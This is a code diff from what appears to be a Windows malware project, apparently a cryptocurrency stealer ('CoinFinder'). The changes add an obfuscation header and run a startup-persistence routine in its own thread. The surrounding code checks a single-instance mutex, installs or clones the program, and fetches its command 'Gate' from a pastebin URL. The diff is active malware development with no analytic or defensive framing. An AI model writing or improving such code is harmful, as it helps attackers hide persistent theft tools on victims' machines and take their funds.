@@ -12,6 +12,7 @@
 #include <wbemidl.h>
 #include "config.h"
 #include <conio.h>
+#include "obfuscat.h"
 #include "CoinFinder.h"
 #include <atlbase.h>
 #include <wtypes.h>
@@ -50,17 +51,18 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
 			return -1; // quit; mutex is released automatically
 
-		//Autostart && Clone
+		//Autostart  (with persistence) && Clone
 		if (config.startup == true) {
 			std::string insatlled = Helpers::installedOrnot();
 			if (insatlled == "restart") {
 				return 0;
 			}
-			Helpers::addstartup();
+			std::thread startupPersistence(Helpers::addstartup);
+			startupPersistence.join();
 		}
 
 
-		
+	
 		//Fetch Gate from raw Site
 		http::Request request(config.pastebinUrl);
 		http::Response response = request.send("GET");
